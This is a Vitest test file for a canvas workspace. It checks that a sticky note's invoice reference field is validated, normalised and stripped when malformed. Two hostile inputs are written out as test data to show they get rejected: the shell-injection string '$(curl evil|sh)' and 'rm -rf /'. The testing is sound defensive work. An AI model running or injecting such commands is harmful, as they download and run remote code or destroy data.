import { describe, expect, it } from 'vitest'
import type { CanvasNodeState } from '@shared/types'
import { normalizeDisInvoiceRef } from '@shared/dis-invoice'
import { duplicateNode, flowToNodeStates, nodeStatesToFlow, type CanvasNode } from './workspace'
import { toKanbanSession } from '../canvas/toKanbanSession'
import { toKanbanSessionState } from '../canvas/toKanbanSessionState'

const REF = { taskId: 101, columnaId: 2, textHash: 'a1b2c3' }

const state = (over: Partial<CanvasNodeState> & Record<string, unknown>): CanvasNodeState =>
  ({
    id: 'sticky-1',
    kind: 'sticky',
    position: { x: 0, y: 0 },
    size: { width: 100, height: 100 },
    title: 'Note',
    color: '#ffd60a',
    group: null,
    text: 'Migrar el DNS',
    ...over
  }) as CanvasNodeState

const flow = (data: Record<string, unknown>, type = 'sticky'): CanvasNode =>
  ({ id: 'sticky-1', type, position: { x: 0, y: 0 }, data: { title: 'Note', color: '#fff', group: null, text: 'x', ...data } }) as CanvasNode

describe('disInvoiceRef at the serializer seams', () => {
  it('survives a full round trip, movedToFinished included', () => {
    const finished = { ...REF, movedToFinished: true as const }
    const loaded = nodeStatesToFlow([state({ disInvoiceRef: finished })])
    expect(loaded[0].data.disInvoiceRef).toEqual(finished)
    expect(flowToNodeStates(loaded)[0].disInvoiceRef).toEqual(finished)
    expect(JSON.parse(JSON.stringify(flowToNodeStates(loaded)))[0].disInvoiceRef).toEqual(finished)
  })

  it.each([
    ['a string', 'task-101'],
    ['a zero id', { ...REF, taskId: 0 }],
    ['a fractional column', { ...REF, columnaId: 1.5 }],
    ['a hash with shell text', { ...REF, textHash: '$(curl evil|sh)' }],
    ['an oversized hash', { ...REF, textHash: 'a'.repeat(33) }],
    ['a missing hash', { taskId: 1, columnaId: 1 }]
  ])('drops %s on the way in and keeps the note', (_name, hostile) => {
    const loaded = nodeStatesToFlow([state({ disInvoiceRef: hostile as never })])
    expect(loaded[0].data.disInvoiceRef).toBeUndefined()
    expect(loaded[0].data.text).toBe('Migrar el DNS')
  })

  it('drops a malformed value on the way out', () => {
    expect(flowToNodeStates([flow({ disInvoiceRef: { ...REF, textHash: 'not hex!' } })])[0].disInvoiceRef).toBeUndefined()
  })

  it('strips anything smuggled in beside a valid ref', () => {
    const loaded = nodeStatesToFlow([state({ disInvoiceRef: { ...REF, finished: 'yes', prompt: 'rm -rf /' } as never })])
    expect(loaded[0].data.disInvoiceRef).toEqual(REF)
    expect(normalizeDisInvoiceRef({ ...REF, movedToFinished: true })).toEqual({ ...REF, movedToFinished: true })
  })

  it('loads a sticky synced before the rename, whose ref says `finished`, as moved to finished', () => {
    const stored = JSON.parse(JSON.stringify([state({ disInvoiceRef: { ...REF, finished: true } as never })]))
    const loaded = nodeStatesToFlow(stored)
    expect(loaded[0].data.disInvoiceRef).toEqual({ ...REF, movedToFinished: true })
    expect(flowToNodeStates(loaded)[0].disInvoiceRef).toEqual({ ...REF, movedToFinished: true })
  })

  it('is honoured only on a sticky', () => {
    const terminal = nodeStatesToFlow([state({ kind: 'terminal', disInvoiceRef: REF })])
    expect(terminal[0].type).toBe('terminal')
    expect(terminal[0].data.disInvoiceRef).toBeUndefined()
    expect(flowToNodeStates([flow({ disInvoiceRef: REF }, 'terminal')])[0].disInvoiceRef).toBeUndefined()
    expect(flowToNodeStates([flow({ disInvoiceRef: REF })])[0].disInvoiceRef).toEqual(REF)
  })

  it('a duplicate is an ordinary note, so one task never has two mirrors', () => {
    const copy = duplicateNode(flow({ disInvoiceRef: REF }))
    expect(copy.id).not.toBe('sticky-1')
    expect(copy.data.text).toBe('x')
    expect(copy.data.disInvoiceRef).toBeUndefined()
  })
})

describe('disInvoiceRef on a card', () => {
  it('rides both card derivations, validated', () => {
    expect(toKanbanSession(flow({ disInvoiceRef: REF }))?.disInvoiceRef).toEqual(REF)
    expect(toKanbanSessionState(state({ disInvoiceRef: REF }))?.disInvoiceRef).toEqual(REF)
    expect(toKanbanSession(flow({ disInvoiceRef: { taskId: 'x' } }))?.disInvoiceRef).toBeUndefined()
    expect(toKanbanSessionState(state({ disInvoiceRef: { taskId: 'x' } as never }))?.disInvoiceRef).toBeUndefined()
  })
})
